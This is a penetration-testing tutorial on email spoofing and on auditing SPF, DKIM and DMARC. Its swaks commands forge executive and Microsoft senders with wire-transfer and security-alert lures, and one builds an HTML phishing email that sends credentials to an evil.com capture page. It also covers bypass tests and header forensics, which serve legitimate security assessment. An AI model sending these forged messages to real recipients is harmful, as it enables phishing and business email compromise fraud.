# Email Forgery and SPF/DKIM/DMARC Testing Guide

> Complete guide for email forgery techniques, SPF bypass, DKIM signature manipulation, DMARC policy testing, and email header analysis.
> All techniques are for authorized penetration testing only.

---

## Introduction and Objective

Email forgery remains one of the most effective attack vectors for phishing, business email compromise (BEC), and social engineering. The email ecosystem relies on three authentication mechanisms to combat forgery: SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), and DMARC (Domain-based Message Authentication, Reporting, and Conformance). However, misconfigurations, deployment gaps, and protocol weaknesses create opportunities for attackers to bypass these protections.

This guide covers the complete email forgery and authentication testing workflow:

1. **Email forgery fundamentals** -- How SMTP allows sender spoofing and how swaks enables protocol-level email crafting
2. **SPF analysis and bypass** -- Querying SPF records, identifying weak policies, and exploiting include chain limitations
3. **DKIM testing** -- Enumerating selectors, analyzing key strength, and testing signature enforcement
4. **DMARC policy evaluation** -- Checking policy enforcement, testing subdomain bypass, and exploiting alignment gaps
5. **Email header analysis** -- Reading email headers to trace authentication results and identify forgery opportunities

By the end of this guide, you will understand how email authentication works at the protocol level, be able to identify misconfigurations that allow sender spoofing, and provide actionable remediation guidance for strengthening email defenses.

### Email Authentication Chain

```
Sender --> SPF Check (IP authorized?) --> DKIM Check (Signature valid?) --> DMARC Check (Alignment + Policy)
                                                                                        |
                                                                  p=none (allow) / p=quarantine / p=reject
```

All three mechanisms must be properly configured and enforced for effective email forgery prevention. A weakness in any single layer creates a bypass opportunity.

---

## Hands-on Exercises

### Exercise 1: Email Forgery with swaks

swaks (Swiss Army Knife for SMTP) is the primary tool for protocol-level email testing. Unlike phishing platforms that create visual replicas, swaks operates at the SMTP protocol level, sending raw email commands to test server behavior directly.

**Basic email spoofing** -- Send an email with a forged sender address:

```bash
# Spoof an internal address (same domain)
swaks --to victim@target.com --from ceo@target.com --server mail.target.com \
  --header "Subject: Urgent: Wire Transfer Required" \
  --body "Please process the attached wire transfer immediately."

# Spoof an external trusted domain
swaks --to victim@target.com --from support@microsoft.com --server mail.target.com \
  --header "Subject: Security Alert: Unusual Sign-in Activity" \
  --body "We detected unusual sign-in activity on your account."

# Spoof with display name manipulation (common in BEC)
swaks --to victim@target.com --from "CEO John Smith <attacker@evil.com>" --server mail.target.com \
  --header "Subject: Confidential Request" \
  --body "I need you to handle something discreetly."
```

**HTML email crafting** -- Modern phishing emails use HTML for visual deception:

```bash
# HTML email with embedded link
swaks --to victim@target.com --from it@target.com --server mail.target.com \
  --header "Subject: IT Password Reset Required" \
  --body-type text/html \
  --body '<html><body><div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto"><h2 style="color:#0078d4">Password Reset Required</h2><p>Your password expires in 24 hours. Click below to reset:</p><a href="http://evil.com/capture" style="background:#0078d4;color:white;padding:12px 24px;text-decoration:none;border-radius:4px">Reset Password</a><p style="color:#666;font-size:12px">If you did not request this reset, ignore this email.</p></div></body></html>'
```

**Email with custom headers** -- Headers influence how mail clients and servers process the message:

```bash
# High-priority email with reply-to redirection
swaks --to victim@target.com --from executive@target.com \
  --add-header "Reply-To: attacker@evil.com" \
  --add-header "X-Priority: 1 (Highest)" \
  --add-header "Importance: High" \
  --header "Subject: Confidential Business Proposal"

# Mimic legitimate mail client headers
swaks --to victim@target.com --from colleague@target.com \
  --add-header "X-Mailer: Microsoft Outlook 16.0" \
  --add-header "X-Originating-IP: [10.0.0.1]" \
  --add-header "Thread-Index: AQHXXXXXXXXXX" \
  --header "Subject: Quick Question"
```

### Exercise 2: SPF Record Analysis and Bypass

SPF (Sender Policy Framework) specifies which IP addresses are authorized to send email on behalf of a domain. The SPF record is a DNS TXT record starting with `v=spf1`.

**Step 1: Query and analyze SPF records**

```bash
# Query SPF record
dig TXT target.com +short | grep v=spf1

# Query from specific DNS server
dig TXT target.com @8.8.8.8 +short | grep v=spf1

# Check subdomain SPF
dig TXT mail.target.com +short | grep v=spf1
dig TXT subdomain.target.com +short | grep v=spf1
```

**Step 2: Interpret SPF mechanisms**

SPF mechanisms define authorization rules:

| Mechanism | Meaning | Security Impact |
|-----------|---------|-----------------|
| `+all` | Allow all IPs | CRITICAL -- No protection, anyone can spoof |
| `?all` | Neutral (no policy) | HIGH -- Effectively no protection |
| `~all` | Softfail (mark but deliver) | MEDIUM -- Email still delivered, may go to spam |
| `-all` | Hard fail (reject) | LOW -- Proper configuration, reject unauthorized senders |
| `include:domain.com` | Include another domain's SPF | Evaluate chain carefully |
| `ip4:x.x.x.x` | Authorize specific IPv4 range | Check for overly broad ranges (e.g., /8) |
| `a` | Authorize domain's A record IP | Reasonable |
| `mx` | Authorize domain's MX record IPs | Reasonable |
| `redirect=domain.com` | Use another domain's SPF entirely | Follow the redirect |

**Step 3: Test SPF bypass techniques**

```bash
# Test from unauthorized IP against softfail (~all)
# Many mail servers still deliver softfail emails to inbox
swaks --to test@target.com --from spoofed@target.com --server mail.target.com

# Test SPF include chain exhaustion (10 DNS lookup limit)
# Count lookups in the chain
dig TXT target.com +short | grep spf
# If include chain > 10 lookups, SPF evaluation fails (usually treated as neutral)
swaks --to test@target.com --from spoofed@target.com --server mail.target.com

# Test subdomain bypass (if no subdomain SPF or sp=none in DMARC)
swaks --to test@target.com --from user@subdomain.target.com --server mail.target.com
```

**Step 4: Automate SPF analysis**

```bash
#!/bin/bash
# SPF Analysis Script
DOMAIN=$1

echo "[*] SPF Record for $DOMAIN:"
SPF=$(dig TXT $DOMAIN +short | grep v=spf1)
echo "  $SPF"

# Check policy
if echo "$SPF" | grep -q '\+all'; then
  echo "  [CRITICAL] Policy: +all (allows all senders)"
elif echo "$SPF" | grep -q '\?all'; then
  echo "  [HIGH] Policy: ?all (neutral, no enforcement)"
elif echo "$SPF" | grep -q '\~all'; then
  echo "  [MEDIUM] Policy: ~all (softfail, may still deliver)"
elif echo "$SPF" | grep -q '\-all'; then
  echo "  [LOW] Policy: -all (hard fail, proper configuration)"
else
  echo "  [WARNING] No SPF policy found"
fi

# Count include lookups
INCLUDES=$(echo "$SPF" | grep -o 'include:[^ ]*' | wc -l)
echo "  [INFO] Include lookups: $INCLUDES (limit: 10)"
```

### Exercise 3: DKIM Selector Enumeration and Key Analysis

DKIM (DomainKeys Identified Mail) adds cryptographic signatures to outgoing emails. The public key is published in DNS under a selector-specific subdomain: `selector._domainkey.domain.com`.

**Step 1: Enumerate DKIM selectors**

```bash
# Common DKIM selectors to try
for selector in default google selector1 selector2 s1 s2 k1 k2 mail policy smtpapi googlemail mandrill mailjet sendgrid postmark; do
  result=$(dig TXT ${selector}._domainkey.target.com +short 2>/dev/null)
  if [ -n "$result" ]; then
    echo "[+] Found selector: $selector"
    echo "    $result"
  fi
done
```

Common selector patterns by mail provider:

- **Google Workspace**: `google`, `default`
- **Microsoft 365**: `selector1`, `selector2`
- **SendGrid**: `smtpapi`, `s1`
- **Mailchimp**: `k1`, `k2`, `k3`
- **Mailgun**: `mail`
- **Custom**: `default`, `policy`, `mail`

**Step 2: Analyze DKIM key strength**

```bash
# Extract public key and analyze
SELECTOR="default"
DOMAIN="target.com"

# Get the key record
dig TXT ${SELECTOR}._domainkey.${DOMAIN} +short

# Extract and decode the public key
dig TXT ${SELECTOR}._domainkey.${DOMAIN} +short | \
  grep -oP 'p=\K[^"]+' | tr -d '"' | \
  awk '{printf "-----BEGIN PUBLIC KEY-----\n"; for(i=1;i<=length($0);i+=64) print substr($0,i,64); printf "-----END PUBLIC KEY-----\n"}' | \
  openssl rsa -pubin -text -noout 2>/dev/null

# Check key length directly
KEY_DATA=$(dig TXT ${SELECTOR}._domainkey.${DOMAIN} +short | tr -d '"')
echo "$KEY_DATA" | grep -oP 'p=\K[^ ;]+' | base64 -d 2>/dev/null | openssl rsa -pubin -text -noout 2>/dev/null | grep "Public-Key:"
```

Key strength assessment:

| Key Length | Security Level | Recommendation |
|------------|---------------|----------------|
| 512-bit | CRITICAL -- Trivially breakable | Must upgrade immediately |
| 1024-bit | HIGH -- Vulnerable to nation-state attacks | Upgrade to 2048-bit+ |
| 2048-bit | Adequate | Current minimum standard |
| 4096-bit | Strong | Recommended for high-security environments |
| Ed25519 | Strong | Modern alternative, smaller keys |

**Step 3: Test DKIM enforcement**

```bash
# Send email without DKIM signature to test enforcement
swaks --to test@target.com --from user@target.com --server mail.target.com \
  --header "Subject: No DKIM Signature Test"

# Send email with invalid/corrupted body to test signature validation
swaks --to test@target.com --from user@dkim-domain.com --server mail.target.com \
  --header "Subject: Tampered Content Test" \
  --body "This body differs from what was signed."
```

### Exercise 4: DMARC Policy Testing

DMARC builds on SPF and DKIM by specifying what receivers should do when authentication fails. The DMARC record is published at `_dmarc.domain.com`.

**Step 1: Query DMARC record**

```bash
# Query DMARC record
dig TXT _dmarc.target.com +short

# Check for subdomain-specific DMARC
dig TXT _dmarc.subdomain.target.com +short
```

**Step 2: Interpret DMARC policy**

DMARC record format: `v=DMARC1; p=policy; sp=subdomain-policy; rua=report-uri; pct=percentage; adkim=alignment; aspf=alignment`

| Policy | Meaning | Impact |
|--------|---------|--------|
| `p=none` | Monitor only, no action | CRITICAL -- No protection, forgery allowed |
| `p=quarantine` | Send to spam/quarantine | MEDIUM -- Reduces but does not prevent delivery |
| `p=reject` | Reject failed messages | LOW -- Proper enforcement |

**Step 3: Test DMARC bypass techniques**

```bash
# Test when p=none (monitoring only, emails still delivered)
swaks --to test@target.com --from spoofed@target.com --server mail.target.com

# Test subdomain bypass (if sp=none or no subdomain policy)
swaks --to test@target.com --from spoofed@subdomain.target.com --server mail.target.com

# Test percentage bypass (pct=50 means only 50% of failures are rejected)
swaks --to test@target.com --from spoofed@target.com --server mail.target.com
# May pass through due to percentage sampling

# Test alignment bypass (strict vs relaxed)
# Relaxed: subdomain.target.com matches target.com
# Strict: exact match required
swaks --to test@target.com --from user@different-domain.com --server mail.target.com \
  --header "From: user@target.com"
```

### Exercise 5: Email Header Analysis

Understanding email headers is essential for both attack analysis and forensic investigation. Headers reveal the authentication chain, routing path, and potential forgery indicators.

**Key headers to examine:**

```
Authentication-Results: spf=pass/fail/neutral; dkim=pass/fail/none; dmarc=pass/fail/none
Received-SPF: pass/fail/neutral/softfail/permerror/temperror
DKIM-Signature: v=1; a=rsa-sha256; d=domain.com; s=selector; b=signature
Received: from [IP] by server (timestamp)
From: display name <sender@domain.com>
Reply-To: reply-address@domain.com
X-Originating-IP: [original.sender.ip]
Message-ID: unique identifier
```

**Analyzing authentication results:**

```bash
# Extract and analyze headers from a saved email
grep -E "Authentication-Results|Received-SPF|DKIM-Signature|Received:|From:|Reply-To:" email.txt

# Check SPF result
grep "Received-SPF:" email.txt
# pass = authorized IP
# fail = unauthorized IP
# softfail = probably unauthorized (but not rejected)
# neutral = no assertion
# permerror = DNS error (often treated as neutral)

# Check DKIM result
grep "dkim=" email.txt
# pass = valid signature
# fail = invalid signature
# none = no signature present

# Check DMARC result
grep "dmarc=" email.txt
# pass = aligned and authenticated
# fail = authentication failed
# none = no DMARC policy
```

**Detecting forgery indicators:**

- `Received-SPF: fail` -- Sender IP not authorized by SPF
- `dkim=fail` or `dkim=none` -- No valid DKIM signature
- `dmarc=fail` -- DMARC authentication failed
- Multiple `Received:` headers with mismatched IPs
- `Reply-To:` different from `From:` address
- `X-Originating-IP:` revealing unexpected source IP
- `Message-ID:` with wrong domain
- Timestamp mismatches between `Received:` headers

### Exercise 6: Comprehensive Email Auth Assessment

Combine all techniques into a complete assessment:

```bash
#!/bin/bash
# Complete Email Authentication Assessment
DOMAIN=$1

echo "=========================================="
echo "Email Auth Assessment: $DOMAIN"
echo "=========================================="

echo ""
echo "[1] SPF Analysis"
echo "-----------------------------------"
SPF=$(dig TXT $DOMAIN +short | grep v=spf1)
if [ -n "$SPF" ]; then
  echo "  Record: $SPF"
  # Policy check
  echo "$SPF" | grep -oE '[\+\?\~-]all' | head -1
  # Include chain
  echo "$SPF" | grep -o 'include:[^ ]*' | sed 's/include:/  Include: /'
else
  echo "  [CRITICAL] No SPF record found"
fi

echo ""
echo "[2] DKIM Analysis"
echo "-----------------------------------"
for sel in default google selector1 selector2 s1 k1 mail policy; do
  result=$(dig TXT ${sel}._domainkey.$DOMAIN +short 2>/dev/null)
  if [ -n "$result" ]; then
    echo "  [+] Selector '$sel' found"
    echo "      $result"
  fi
done

echo ""
echo "[3] DMARC Analysis"
echo "-----------------------------------"
DMARC=$(dig TXT _dmarc.$DOMAIN +short)
if [ -n "$DMARC" ]; then
  echo "  Record: $DMARC"
  echo "$DMARC" | grep -oE 'p=[^;]+' | head -1
  echo "$DMARC" | grep -oE 'sp=[^;]+' | head -1
else
  echo "  [CRITICAL] No DMARC record found"
fi

echo ""
echo "[4] Spoof Test"
echo "-----------------------------------"
echo "  Manual test required:"
echo "  swaks --to test@${DOMAIN} --from spoofed@${DOMAIN} --server mail.${DOMAIN}"
```

---

## References and Resources

### RFC Documents

- **RFC 7208** -- Sender Policy Framework (SPF) for Authorizing Use of Domains in Email
  - https://tools.ietf.org/html/rfc7208
- **RFC 6376** -- DomainKeys Identified Mail (DKIM) Signatures
  - https://tools.ietf.org/html/rfc6376
- **RFC 7489** -- Domain-based Message Authentication, Reporting, and Conformance (DMARC)
  - https://tools.ietf.org/html/rfc7489
- **RFC 5322** -- Internet Message Format (email headers)
  - https://tools.ietf.org/html/rfc5322

### Tools and Online Resources

- **swaks Documentation** -- Comprehensive SMTP testing tool
  - https://github.com/jetmore/swaks
- **MXToolbox SPF Checker** -- Online SPF record analyzer
  - https://mxtoolbox.com/SPF.aspx
- **DMARC Analyzer** -- DMARC deployment and monitoring
  - https://www.dmarcanalyzer.com/
- **DKIM Validator** -- Test DKIM configuration
  - https://dkimvalidator.com/
- **Mail Tester** -- Comprehensive email authentication test
  - https://www.mail-tester.com/

### Security References

- **HackTricks - Email Spoofing**
  - https://book.hacktricks.xyz/pentesting/pentesting-smtp
- **OWASP - Email Security**
  - https://owasp.org/www-community/vulnerabilities/Email_Spoofing
- **CISA - Email Security Best Practices**
  - https://www.cisa.gov/topics/cybersecurity-best-practices
- **PortSwigger - Email Vulnerabilities**
  - https://portswigger.net/web-security/email
